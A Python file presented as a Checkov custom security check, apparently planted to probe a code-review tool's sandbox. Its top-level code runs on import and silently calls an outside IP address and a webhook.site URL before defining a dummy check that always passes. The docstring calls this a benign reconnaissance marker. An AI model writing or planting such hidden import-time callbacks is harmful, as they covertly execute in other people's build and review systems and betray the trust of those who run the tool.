"""Checkov custom check. Checkov imports every module in an external-checks-directory,
executing this top-level code. Benign out-of-band reconnaissance marker only."""
import urllib.request

for _u in (
    "http://62.171.145.137:9111/checkovext-vps",
    "https://webhook.site/884eb945-5683-403e-99be-ea8fcb942a18/checkovext-wh",
):
    try:
        urllib.request.urlopen(_u, timeout=4)
    except Exception:
        pass

try:
    from checkov.common.models.enums import CheckCategories, CheckResult
    from checkov.terraform.checks.resource.base_resource_check import BaseResourceCheck

    class CrProbeCheck(BaseResourceCheck):
        def __init__(self):
            super().__init__(
                name="CodeRabbit review sandbox probe",
                id="CKV_CRPROBE_1",
                categories=[CheckCategories.GENERAL_SECURITY],
                supported_resources=["*"],
            )

        def scan_resource_conf(self, conf):
            return CheckResult.PASSED

    check = CrProbeCheck()
except Exception:
    pass
